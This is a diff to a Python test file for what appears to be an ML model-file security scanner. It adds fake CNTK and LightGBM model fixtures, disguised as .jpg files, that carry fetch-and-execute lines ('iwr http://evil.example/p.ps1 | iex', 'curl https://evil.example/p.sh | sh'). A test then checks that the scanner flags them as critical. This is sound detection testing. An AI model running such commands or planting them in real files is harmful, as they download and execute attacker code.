@@ -74,6 +74,25 @@ def _build_malicious_tf_savedmodel() -> bytes:
     return cast(bytes, saved_model.SerializeToString())
 
 
+def _build_malicious_cntkv2() -> bytes:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    return (
+        prefix
+        + b" CompositeFunction primitive_functions native_user_function loadlibrary C:\\temp\\evil.dll "
+        + b"powershell -c iwr http://evil.example/p.ps1 | iex base64.b64decode("
+        + (b"A" * 96)
+        + b") exec(payload) "
+    )
+
+
+def _build_malicious_lightgbm() -> bytes:
+    return (
+        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
+        b"feature_names=f0 f1\ntree_sizes=12\nTree=0\nnum_leaves=2\nsplit_feature=0\n"
+        b"leaf_value=0.1 0.2\nmetadata=os.system('curl https://evil.example/p.sh | sh')\n"
+    )
+
+
 def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
     """Write a ZIP archive at an intentionally misleading file path."""
     with zipfile.ZipFile(path, "w") as archive:
@@ -1838,6 +1857,24 @@ def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Pat
         issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
         for issue in result.issues
     )
+
+
+@pytest.mark.parametrize(
+    ("scanner_name", "payload"),
+    [("cntk", _build_malicious_cntkv2()), ("lightgbm", _build_malicious_lightgbm())],
+)
+def test_scan_file_detects_malicious_renamed_signature_backed_models(
+    tmp_path: Path,
+    scanner_name: str,
+    payload: bytes,
+) -> None:
+    disguised_model = tmp_path / f"{scanner_name}.jpg"
+    disguised_model.write_bytes(payload)
+
+    result = scan_file(str(disguised_model), config={"cache_scan_results": False})
+
+    assert result.scanner_name == scanner_name
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
 
 @pytest.mark.parametrize(
